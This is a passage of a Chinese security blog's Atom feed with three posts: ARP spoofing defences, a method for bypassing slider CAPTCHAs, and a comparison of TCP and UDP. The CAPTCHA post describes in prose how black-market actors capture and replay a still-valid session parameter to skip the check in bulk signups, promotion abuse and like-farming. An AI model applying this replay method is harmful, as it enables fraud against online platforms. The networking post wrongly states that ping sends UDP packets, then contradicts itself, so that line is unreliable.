&lt;h2 id=&quot;arp-高速缓存超时设置&quot;&gt;&lt;strong&gt;ARP 高速缓存超时设置&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在ARP高速缓存中的表项一般都要设置超时值，缩短这个这个超时值能够有用的避免ARP表的溢出。&lt;/p&gt;

&lt;h2 id=&quot;ipmac访问操控--推荐使用&quot;&gt;&lt;strong&gt;IP+MAC访问操控  —–推荐使用&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;单纯依托IP或MAC来树立信赖联系是不安全，抱负的安全联系树立在IP+MAC的根底上，这也是咱们校园网上网有必要绑定IP和MAC的因素之一&lt;/p&gt;

&lt;h2 id=&quot;静态arp缓存表&quot;&gt;&lt;strong&gt;静态ARP缓存表&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;每台主机都有一个暂时寄存IP-MAC的对应表ARP攻击就经过更改这个缓存来到达诈骗的意图，运用静态的ARP来绑定正确的MAC是一个有用的办法，在命令行下运用arp -a能够检查当时的ARP缓存表。&lt;/p&gt;

&lt;h2 id=&quot;自动查询&quot;&gt;&lt;strong&gt;自动查询&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在某个正常的时间，做一个IP和MAC对应的数据库，以后定时检查当时的IP和MAC对应联系是否正常，定时检查交流机的流量列表，检查丢包率。&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">滑动验证码黑产</title><link href="http://localhost:4000/_posts/2020-06-15-%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%BB%91%E4%BA%A7/" rel="alternate" type="text/html" title="滑动验证码黑产" /><published>2020-06-15T00:00:00+08:00</published><updated>2020-06-15T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%BB%91%E4%BA%A7</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-15-%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%BB%91%E4%BA%A7/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;session参数重复校验漏洞&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;思路&quot;&gt;思路&lt;/h1&gt;

&lt;p&gt;由于每次拖动滑块后，会发送一个Request请求数据包到服务器，服务器会验证这个Request请求数据包里携带的位移参数，来判断是否是拖动滑块到了正确的缺口位置。而服务器接收的数据包有很多，除了你发送的，也还会有其他人发送的请求，所以需要一个session参数来作为标识。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;首先，触发滑动验证机制&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接着，滑动滑块到正确缺口位置，然后抓包。分析数据包，寻找session参数。&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;每次滑动正确位移后，使用Brupsuite或者其它中间人代理工具，抓包提取数据包里的session参数，保存到本地&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;因为服务器后端默认隐含对我们本地保存的session参数有一个有效时间和有效次数，所以我们不需要再去滑动验证码，直接在session的有效期内发送Request请求数据包到服务器即可验证成功！&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;最后黑产在实际批量注册，薅羊毛或刷赞过程中，遇到触发的滑动验证码机制，只要session在有效期内，只需使用python读取本地的txt内容，调用requests库发送请求数据包，即可绕过滑动验证码&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">TCP&amp;amp;UDP区别</title><link href="http://localhost:4000/_posts/2020-06-13-TCP&UDP%E5%8C%BA%E5%88%AB/" rel="alternate" type="text/html" title="TCP&amp;UDP区别" /><published>2020-06-13T00:00:00+08:00</published><updated>2020-06-13T00:00:00+08:00</updated><id>http://localhost:4000/_posts/TCP&amp;UDP%E5%8C%BA%E5%88%AB</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-13-TCP&amp;UDP%E5%8C%BA%E5%88%AB/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;tcp协议与udp协议的区别&quot;&gt;&lt;strong&gt;TCP协议与UDP协议的区别&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;TCP/IP协议是一个协议簇。里面包括很多协议的，UDP只是其中的一个， 之所以命名为TCP/IP协议，因为TCP、IP协议是两个很重要的协议，就用他两命名了。&lt;/p&gt;

&lt;p&gt;TCP/IP协议集包括应用层,传输层，网络层，网络访问层。&lt;/p&gt;

&lt;h2 id=&quot;应用层包括&quot;&gt;应用层包括&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;超文本传输协议（HTTP）:万维网的基本协议；&lt;/li&gt;
  &lt;li&gt;文件传输（TFTP简单文件传输协议）；&lt;/li&gt;
  &lt;li&gt;远程登录（Telnet），提供远程访问其它主机功能, 它允许用户登录internet主机，并在这台主机上执行命令；&lt;/li&gt;
  &lt;li&gt;网络管理（SNMP简单网络管理协议），该协议提供了监控网络设备的方法， 以及配置管理,统计信息收集,性能管理及安全管理等；&lt;/li&gt;
  &lt;li&gt;域名系统（DNS），该系统用于在internet中将域名及其公共广播的网络节点转换成IP地址。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;网络层包括&quot;&gt;网络层包括&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Internet协议（IP）；&lt;/li&gt;
  &lt;li&gt;Internet控制信息协议（ICMP）；&lt;/li&gt;
  &lt;li&gt;地址解析协议（ARP）；&lt;/li&gt;
  &lt;li&gt;反向地址解析协议（RARP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;网络访问层&quot;&gt;网络访问层&lt;/h2&gt;

&lt;p&gt;网络访问层又称作主机到网络层（host-to-network），网络访问层的功能包括IP地址与物理地址硬件的映射，  以及将IP封装成帧.基于不同硬件类型的网络接口，网络访问层定义了和物理介质的连接.&lt;/p&gt;

&lt;h1 id=&quot;tcp协议和udp协议的区别&quot;&gt;&lt;strong&gt;TCP协议和UDP协议的区别&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;TCP（Transmission Control  Protocol，传输控制协议）是面向连接的协议，也就是说，在收发数据前，必须和对方建立可靠的连接。  一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂， 只简单的描述下这三次对话的简单过程:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；&lt;/li&gt;
  &lt;li&gt;主机B向主机A发送同意连接和要求同步 （同步就是两台主机一个在发送，一个在接收，协调工作）的数据包 ：“可以，你什么时候发？”，这是第二次对话；&lt;/li&gt;
  &lt;li&gt;主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”， 这是第三次对话。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三次“对话”的目的是使数据包的发送和接收同步， 经过三次“对话”之后，主机A才向主机B正式发送数据。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/_posts/2020-06-12-TCP三次握手四次挥手.md&quot;&gt;详细参考&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;名词解释&quot;&gt;名词解释&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ACK 是TCP报头的控制位之一，对数据进行确认。确认由目的端发出， 用它来告诉发送端这个序列号之前的数据段都收到了。  比如确认号为X，则表示前X-1个数据段都收到了，只有当ACK=1时,确认号才有效，当ACK=0时，确认号无效，这时会要求重传数据，保证数据的完整性。&lt;/li&gt;
  &lt;li&gt;SYN 同步序列号，TCP建立连接时将这个位置1。&lt;/li&gt;
  &lt;li&gt;FIN 发送端完成发送任务位，当TCP完成数据传输需要断开时,，提出断开连接的一方将这位置1。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tcp的包头结构&quot;&gt;TCP的包头结构&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;源端口 16位；&lt;/li&gt;
  &lt;li&gt;目标端口 16位；&lt;/li&gt;
  &lt;li&gt;序列号 32位；&lt;/li&gt;
  &lt;li&gt;回应序号 32位；&lt;/li&gt;
  &lt;li&gt;TCP头长度 4位；&lt;/li&gt;
  &lt;li&gt;reserved 6位；&lt;/li&gt;
  &lt;li&gt;控制代码 6位；&lt;/li&gt;
  &lt;li&gt;窗口大小 16位；&lt;/li&gt;
  &lt;li&gt;偏移量 16位；&lt;/li&gt;
  &lt;li&gt;校验和 16位；&lt;/li&gt;
  &lt;li&gt;选项 32位(可选)；&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;这样我们得出了TCP包头的最小长度，为20字节。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;udpuser-data-protocol用户数据报协议&quot;&gt;&lt;strong&gt;UDP（User Data Protocol，用户数据报协议）&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;UDP是一个非连接的协议，传输数据之前源端和终端不建立连接，  当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。 在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、  计算机的能力和传输带宽的限制； 在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。&lt;/li&gt;
  &lt;li&gt;由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等， 因此一台服务机可同时向多个客户机传输相同的消息。&lt;/li&gt;
  &lt;li&gt;UDP信息包的标题很短，只有8个字节，相对于TCP的20个字节信息包的额外开销很小。&lt;/li&gt;
  &lt;li&gt;吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、 源端和终端主机性能的限制。&lt;/li&gt;
  &lt;li&gt;UDP使用尽最大努力交付，即不保证可靠交付， 因此主机不需要维持复杂的链接状态表（这里面有许多参数）。&lt;/li&gt;
  &lt;li&gt;UDP是面向报文的。发送方的UDP对应用程序交下来的报文， 在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界， 因此，应用程序需要选择合适的报文大小。&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;我们经常使用“ping”命令来测试两台主机之间TCP/IP通信是否正常， 其实“ping”命令的原理就是向对方主机发送UDP数据包，然后对方主机确认收到数据包， 如果数据包是否到达的消息及时反馈回来，那么网络就是通的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ping命令&lt;/strong&gt;是用来探测主机到主机之间是否可通信，如果不能&lt;strong&gt;ping&lt;/strong&gt;到某台主机，表明不能和这台主机建立连接。&lt;strong&gt;ping命令&lt;/strong&gt;是使用 IP 和网络控制信息协议 (ICMP)，因而没有涉及到任何传输协议(UDP/TCP) 和应用程序。它发送icmp回送请求消息给目的主机&lt;/p&gt;

&lt;p&gt;ICMP协议规定：目的主机必须返回ICMP回送应答消息给源主机。如果源主机在一定时间内收到应答，则认为主机可达。&lt;/p&gt;

&lt;h2 id=&quot;udp的包头结构&quot;&gt;&lt;strong&gt;UDP的包头结构&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;源端口 16位&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;目的端口 16位&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;长度 16位&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;校验和 16位&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;具体编程时的区别&quot;&gt;具体编程时的区别&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;socket()的参数不同&lt;/li&gt;
  &lt;li&gt;UDP Server不需要调用listen和accept&lt;/li&gt;
  &lt;li&gt;UDP收发数据用sendto/recvfrom函数&lt;/li&gt;
  &lt;li&gt;TCP：地址信息在connect/accept时确定&lt;/li&gt;
  &lt;li&gt;UDP：在sendto/recvfrom函数中每次均 需指定地址信息&lt;/li&gt;
  &lt;li&gt;UDP：shutdown函数无效&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;小结&quot;&gt;小结&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;基于连接与无连接；&lt;/li&gt;
  &lt;li&gt;对系统资源的要求（TCP较多，UDP少）；&lt;/li&gt;
  &lt;li&gt;UDP程序结构较简单；&lt;/li&gt;
  &lt;li&gt;流模式与数据报模式 ；&lt;/li&gt;
  &lt;li&gt;TCP保证数据正确性，UDP可能丢包；&lt;/li&gt;
  &lt;li&gt;TCP保证数据顺序，UDP不保证&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry></feed>